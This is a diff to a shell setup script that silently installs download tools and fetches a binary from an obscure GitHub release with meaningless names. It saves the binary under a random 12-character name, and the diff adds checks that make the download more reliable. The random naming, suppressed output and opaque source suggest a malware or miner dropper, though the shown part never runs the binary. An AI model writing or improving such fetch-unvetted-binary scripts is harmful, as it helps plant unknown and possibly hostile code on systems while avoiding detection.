@@ -13,23 +13,33 @@ chmod 1777 /tmp
 export TMPDIR=/tmp
 
 # Update packages
-apt update -qq
+apt-get update -qq
 
 # Install required packages
-DEBIAN_FRONTEND=noninteractive apt install -y -qq \
-    wget curl ca-certificates > /dev/null 2>&1
+DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
+    wget \
+    curl \
+    ca-certificates \
+    file > /dev/null 2>&1
 
 # Random binary name
 BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
 
-# Download binary (follow redirects)
-curl -L \
+# Download binary
+curl -L --fail --silent --show-error \
 https://github.com/yafcoplk/hmggklo/releases/download/hmggkloj/hmggklo \
 -o "$BIN_NAME"
+
+# Verify binary exists
+if [ ! -f "$BIN_NAME" ]; then
+    echo "Download failed"
+    exit 1
+fi
 
 # Verify it's not HTML
 if file "$BIN_NAME" | grep -qi "html"; then
     echo "Download failed: received HTML instead of binary"
+    rm -f "$BIN_NAME"
     exit 1
 fi
 
